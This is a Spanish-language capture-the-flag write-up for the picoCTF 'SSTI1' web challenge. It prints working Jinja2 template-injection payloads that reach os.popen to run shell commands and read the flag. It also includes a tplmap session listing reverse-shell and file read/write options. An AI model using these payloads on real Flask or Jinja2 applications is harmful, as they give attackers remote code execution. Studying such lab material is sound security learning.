
# SSTI1

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance

I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:53451/)!
## Solucion

```
- Probamos la inyeccion Jinja2

{{4*4}}

- Revisamos si el payload es evaluado:
{{ ''.__class__ }}

- Obtenemos la class del objeto config. En aplicaciones flask, config es tipicamente una instancia de Config la cual hereda de una clase base

{{ config.__class__ }}

- Accedemos al metodo __init__ de la clase Config:

{{ config.__class__.__init__ }}

- Extramos las variables globales disponibles en el ambito de la funcion __init__ . Esto a menudo incluye módulos de Python integrados como os, que es la clave para la ejecución del comando:

{{ config.__class__.__init__.__globals__ }}

- Accedemos al modulo os desde el ambito global:

{{config.__class__.__init__.__globals__['os']}}

- Se utiliza os.popen() para ejecutar comandos de shell

popen('ls').read()

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

```



```
# Home

I built a cool website that lets you announce whatever you want!*

What do you want to announce:  Ok


# 16

{{"".__class__.__mro__[1].__subclasses__()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}

```

## solucion 2

```
┌──(.venv2)─(kali㉿kali)-[~/opt/tplmap]
└─$ python2 tplmap.py -X POST -u http://rescued-float.picoctf.net:51097/announce -d "content=abc"
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'content' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: content
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell                          Run shell on the target
    --os-cmd                            Execute shell commands
    --bind-shell PORT                   Connect to a shell bind to a target port
    --reverse-shell HOST PORT   Send a shell back to the attacker's port
    --upload LOCAL REMOTE       Upload files to the server
    --download REMOTE LOCAL     Download remote files
                                                                                           
┌──(.venv2)─(kali㉿kali)-[~/opt/tplmap]

```
## REferencias
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
- https://medium.com/@mihasha/ssti-1-write-up-picoctf-2025-8574005a93ba






